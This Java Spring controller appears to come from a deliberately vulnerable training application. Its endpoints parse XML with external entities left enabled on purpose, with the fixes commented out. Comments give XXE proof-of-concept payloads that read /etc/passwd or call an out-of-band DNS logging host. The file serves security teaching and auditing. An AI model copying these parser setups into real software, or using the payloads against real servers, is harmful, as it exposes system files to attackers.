package com.best.hello.controller.XXE;

import com.best.hello.util.Security;
import io.swagger.annotations.Api;
import io.swagger.annotations.ApiOperation;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.dom4j.io.SAXReader;
import org.jdom2.input.SAXBuilder;
import org.springframework.web.bind.annotation.*;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.NodeList;
import org.xml.sax.InputSource;
import org.xml.sax.XMLReader;
import org.xml.sax.helpers.XMLReaderFactory;
import org.xmlbeam.annotation.XBRead;

import org.xml.sax.helpers.DefaultHandler;
import javax.xml.bind.JAXBContext;
import javax.xml.bind.Unmarshaller;
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import javax.xml.parsers.SAXParser;
import javax.xml.parsers.SAXParserFactory;
import javax.xml.stream.XMLInputFactory;
import javax.xml.stream.XMLStreamReader;
import java.io.StringReader;

/**
 * 审计的函数
 * 1. XMLReader
 * 2. SAXReader
 * 3. DocumentBuilder
 * 4. XMLStreamReader
 * 5. SAXBuilder
 * 6. SAXParser
 * 7. SAXSource
 * 8. TransformerFactory
 * 9. SAXTransformerFactory
 * 10. SchemaFactory
 * 11. Unmarshaller
 * 12. XPathExpression
 */

@Api("Xml外部实体注入")
@RestController
@RequestMapping("/vulnapi/XXE")
public class XXE {
    Logger log = LoggerFactory.getLogger(XXE.class);

    /**
     * @poc http://127.0.0.1:8888/XXE/XMLReader
     * Content-Type: application/xml
     * payload: <?xml version="1.0" encoding="utf-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://0g5zvd.dnslog.cn">]><root>&xxe;</root>
     */
    @ApiOperation(value = "vul：XMLReader")
    @RequestMapping(value = "/XMLReader")
    public String XMLReader(@RequestParam String content) {
        try {
            log.info("[vul] XMLReader: " + content);

            XMLReader xmlReader = XMLReaderFactory.createXMLReader();
            // 修复：禁用外部实体
            // xmlReader.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
            xmlReader.parse(new InputSource(new StringReader(content)));
            return "XMLReader XXE";
        } catch (Exception e) {
            return e.toString();
        }
    }

    /**
     * javax.xml.parsers.SAXParser 是 XMLReader 的替代品，它提供了更多的安全措施，例如默认禁用 DTD 和外部实体的声明，如果需要使用 DTD 或外部实体，可以手动启用它们，并使用相应的安全措施
     */
    @ApiOperation(value = "vul：SAXParser")
    @RequestMapping(value = "/SAXParser")
    public String SAXParser(@RequestParam String content) {
        try {
            SAXParserFactory factory = SAXParserFactory.newInstance();
            SAXParser parser = factory.newSAXParser();
            parser.parse(new InputSource(new StringReader(content)), new DefaultHandler());
            return "SAXParser XXE";
        } catch (Exception e) {
            return e.toString();
        }
    }


    @ApiOperation(value = "vul：xmlbeam")
    @RequestMapping(value = "/xmlbeam")
    public String handleCustomer(@RequestBody Customer customer) {
        log.info("[vul] xmlbeam: " + customer);
        return String.format("%s:%s login success!", customer.getFirstname(), customer.getLastname());
    }

    public interface Customer {
        @XBRead("//username")
        String getFirstname();

        @XBRead("//password")
        String getLastname();
    }


    @ApiOperation(value = "vul：SAXReader")
    @RequestMapping(value = "/SAXReader")
    public String SAXReader(@RequestParam String content) {
        try {
            SAXReader sax = new SAXReader();
            // 修复：禁用外部实体
            // sax.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
            sax.read(new InputSource(new StringReader(content)));
            return "SAXReader XXE";
        } catch (Exception e) {
            return e.toString();
        }
    }


    @ApiOperation(value = "vul：SAXBuilder", notes = "是一个JDOM解析器，能将路径中的XML文件解析为Document对象")
    @RequestMapping(value = "/SAXBuilder")
    public String SAXBuilder(@RequestBody String content) {
        try {
            SAXBuilder saxbuilder = new SAXBuilder();
            // saxbuilder.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
            saxbuilder.build(new InputSource(new StringReader(content)));
            return "SAXBuilder XXE";
        } catch (Exception e) {
            return e.toString();
        }
    }


    /**
     * @poc http://127.0.0.1:8888/XXE/DocumentBuilder
     * payload: <?xml version="1.0" encoding="utf-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><person><name>&xxe;</name></person>
     */
    @ApiOperation(value = "vul：DocumentBuilder类")
    @RequestMapping(value = "/DocumentBuilder")
    public String DocumentBuilder(@RequestParam String content) {
        try {
            // DocumentBuilderFactory是用于创建DOM模式的解析器对象,newInstance方法会根据本地平台默认安装的解析器，自动创建一个工厂的对象并返回。
            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();

            DocumentBuilder builder = factory.newDocumentBuilder();
            StringReader sr = new StringReader(content);
            InputSource is = new InputSource(sr);
            Document document = builder.parse(is);

            NodeList nodeList = document.getElementsByTagName("person");
            Element element = (Element) nodeList.item(0);
            return String.format("姓名: %s", element.getElementsByTagName("name").item(0).getFirstChild().getNodeValue());

        } catch (Exception e) {
            return e.toString();
        }
    }


    /**
     * @poc http://127.0.0.1:8888/XXE/unmarshaller (POST)
     * payload <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE student[<!ENTITY out SYSTEM "file:///etc/passwd">]><student><name>&out;</name></student>
     */
    @ApiOperation(value = "vul：Unmarshaller")
    @RequestMapping(value = "/unmarshaller")
    public String Unmarshaller(@RequestBody String content) {
        try {

            JAXBContext context = JAXBContext.newInstance(Student.class);
            Unmarshaller unmarshaller = context.createUnmarshaller();

            XMLInputFactory xif = XMLInputFactory.newFactory();
            // 修复：禁用外部实体
            // xif.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, "");
            // xif.setProperty(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, "");

            // 默认情况下在1.8版本上不能加载外部dtd文件，需要更改设置。
            // xif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, true);
            // xif.setProperty(XMLInputFactory.SUPPORT_DTD, true);
            XMLStreamReader xsr = xif.createXMLStreamReader(new StringReader(content));

            Object o = unmarshaller.unmarshal(xsr);
            log.info("[vul] Unmarshaller: " + content);

            return o.toString();

        } catch (Exception e) {
            e.printStackTrace();
        }
        return "出错了！";
    }


    @ApiOperation(value = "safe：检测是否包含ENTITY外部实体")
    @RequestMapping(value = "/safe")
    public String check(@RequestParam String content) {
        if (!Security.checkXXE(content)) {
            return "safe";
        } else {
            return "检测到XXE攻击";
        }
    }

}
